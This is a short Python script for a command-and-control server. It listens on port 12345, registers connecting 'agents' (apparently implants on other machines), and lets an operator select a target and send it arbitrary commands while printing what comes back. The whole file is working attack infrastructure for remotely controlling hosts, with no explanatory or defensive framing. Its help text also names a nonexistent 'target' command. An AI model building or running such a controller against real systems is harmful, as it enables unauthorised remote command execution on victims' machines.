#!/usr/bin/env python

import socket
import time
import threading

from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit import HTML, print_formatted_text as print

known_agents = {}
bufsize = 4096
running = True

def main():
    bind_ip = '0.0.0.0'
    bind_port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.settimeout(10)
    server_socket.bind((bind_ip, bind_port))
    server_socket.listen()

    active_agent = None

    t = threading.Thread(target=handle_new_agent, args=[server_socket])
    t.start()
    global running

    try:
        while running:
            with patch_stdout():
                if active_agent is None:
                    cmd = prompt("> ")
                else:
                    cmd = prompt("(%s)> " %  active_agent)

                tokenized = cmd.split(None)
                if tokenized[0] == "use":
                    if tokenized[1] in known_agents:
                        active_agent = tokenized[1]
                        print("Set active target to %s" % tokenized[1])
                    else:
                        print(HTML("<ansired>Unknown target</ansired>"))
                else:
                    if active_agent is None:
                        print(HTML("<ansired>Pick a target first: target target_address</ansired>"))
                        continue
                    if cmd is not None:
                        known_agents[active_agent].send(cmd.encode())
    except KeyboardInterrupt:
        running = False
        print(HTML("<ansiblue>Waiting for threads to finish...</ansiblue>"))
        t.join()
        server_socket.close()
        exit(0)

def handle_new_agent(server_socket):
    global running
    while running:
        try:
            conn, client_address = server_socket.accept()
            addr_str = "%s:%d" % client_address
            print(HTML("<ansigreen>New agent %s connected</ansigreen>" % addr_str))
            known_agents[addr_str] = conn
            t1 = threading.Thread(target=handle_agent_response, args=[conn]).start()
        except TimeoutError:
            continue

def handle_agent_response(conn):
    global running
    while running:
        data = conn.recv(bufsize)
        if len(data) == 0:
            continue
        resp = data.decode().rstrip()
        if resp != "ready":
            print("resp" + resp)

if __name__ == "__main__":
    main()
